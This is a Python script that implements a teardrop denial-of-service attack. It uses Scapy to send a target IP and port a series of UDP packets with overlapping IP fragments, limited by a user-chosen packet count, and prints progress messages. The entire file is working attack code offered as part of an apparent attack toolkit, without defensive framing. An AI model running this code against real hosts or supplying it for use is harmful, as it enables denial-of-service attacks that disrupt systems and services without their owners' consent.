"""
This Script contains the teardrop attack. This is handled separately as it requires different operation compared
to the other attacks contained in this program
Author: Joseph Whalley
Date: 8/5/23 Version: 1.1
"""

import sys

from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send


def teardrop_attack(target_ip, target_port, limit_choice, limit_value):
    """
    Implementation of a teardrop attack.

    Parameters:
    target_ip (string): The target IP of the attack
    target_port (int): The target Port of the attack
    limit_value (int): The value of the limiter chosen by the user.
    limit_choice (string): The limiter the user wants to use.
    """
    if limit_choice == "time":
        print("[!] Time is a unsupported limiter for this attack. Try again using 'packet'.")
        sys.exit(1)

    else:
        try:
            packet_count = 0

            ip = IP(dst=target_ip)
            udp = UDP(dport=target_port)

            payload = b"\x00" * 800

            # Set initial flags and fragment offset
            ip.flags = "MF"
            ip.frag = 0

            # Send initial packet
            send(ip / udp / payload, verbose=False)
            print("[+] Sending initial packet. Use Ctrl+C to exit attack.")

            # Send overlapping fragments
            fragment_offset = 3
            print("[+] Sending packets with overlapping fragments.")
            for i in range(limit_value):
                ip.frag = fragment_offset
                fragment_offset += 20
                send(ip / udp / payload, verbose=False)
                packet_count += 1

            # Send final packet
            print("[+] Sending final packet.")
            ip.flags = 0
            ip.frag = fragment_offset
            send(ip / udp / payload, verbose=False)

            sys.stdout.write(
                f"\r[+] Attack finished packets sent {(packet_count+2)} packets. Press enter to exit.")
            sys.stdout.flush()
        except KeyboardInterrupt:
            print("[+] Attack exited by Keyboard interrupt.")
